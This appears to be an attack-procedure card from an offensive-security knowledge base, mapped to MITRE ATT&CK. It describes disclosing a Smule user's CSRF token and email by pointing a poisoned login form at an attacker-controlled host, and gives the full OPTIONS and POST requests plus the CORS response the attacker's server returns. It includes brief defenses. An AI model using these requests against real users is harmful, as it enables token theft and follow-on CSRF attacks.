---
id: proc-smule-trigger-disclose-001
name: Trigger-Email-Check-to-Disclose-CSRF-Token
type: procedure
verified: false
submitted: true
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:50.351Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Unsecured Credentials]]'
sub_techniques: []
tags:
  - csrf
  - information-disclosure
commands:
  - '[[commands/send-options-preflight-to-localhost]]'
  - '[[commands/post-email-check-to-localhost]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---

# Trigger-Email-Check-to-Disclose-CSRF-Token

## Summary

This procedure simulates a victim attempting to log in on the poisoned page, causing the browser to send a preflight OPTIONS request followed by a POST to /user/check_email on the attacker-controlled localhost, disclosing the victim's CSRF token and entered email address.

## Description

The poisoned HTML contains login form actions pointing to localhost. When the victim enters an email and submits, the browser performs a CORS preflight (OPTIONS) and then POSTs the data, including the X-CSRF-Token header and email body, directly to the attacker's server. This bypasses Smule's protections and leaks session-bound tokens for further exploitation.

## Requirements

1. Poisoned page loaded in browser with victim session cookies
2. Attacker server listening on localhost:80 for HTTP requests
3. Victim-like browser environment (e.g., with Smule cookies if authenticated)

## Defense

Defensive measures and detection strategies:

- Enforce strict Origin checks in CORS policies
- Use token binding to specific domains and invalidate on suspicious redirects
- Monitor for cross-origin requests to internal/unexpected hosts

## Objectives

1. Trigger requests to attacker host via poisoned links
2. Capture CSRF token and email from headers and body
3. Enable subsequent CSRF attacks using disclosed data

## Instructions

### Step 1: Simulate Login Input

**Context**: Enter email in the poisoned page's login form.

No command; interact with browser form on poisoned page.

> This initiates the OPTIONS preflight. Expected output: Browser sends OPTIONS to localhost.

### Step 2: Send OPTIONS Preflight

**Context**: Handle the CORS preflight request automatically triggered.

**Command** ([[commands/send-options-preflight-to-localhost]]):
```http
OPTIONS /user/check_email HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Access-Control-Request-Method: POST
Access-Control-Request-Headers: x-csrf-token,x-smulen
Origin: https://www.smule.com
Connection: close
```

> Server must respond with Access-Control-Allow-Origin: https://www.smule.com and allow headers. Expected output: 200 OK with CORS headers.

### Step 3: Send POST Email Check

**Context**: Follow up with the actual POST containing sensitive data.

**Command** ([[commands/post-email-check-to-localhost]]):
```http
POST /user/check_email HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.smule.com/s/smule_groups/user_groups/fossnow27
X-CSRF-Token: [redacted]
Content-Type: application/x-www-form-urlencoded
X-Smulen: daf446d26def7faeef4f6527d7f20fae
Content-Length: 31
Origin: https://www.smule.com
Connection: close

email=foo%40bar.com
```

> Log X-CSRF-Token and email. Expected output: JSON response mimicking Smule, e.g., {"email":true,"token":"[CSRF]","mail":"foo@bar.com"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques


## Commands Used

- [[commands/send-options-preflight-to-localhost]]
- [[commands/post-email-check-to-localhost]]

## Tools Used


## Tags

- [[csrf]]
- [[information-disclosure]]
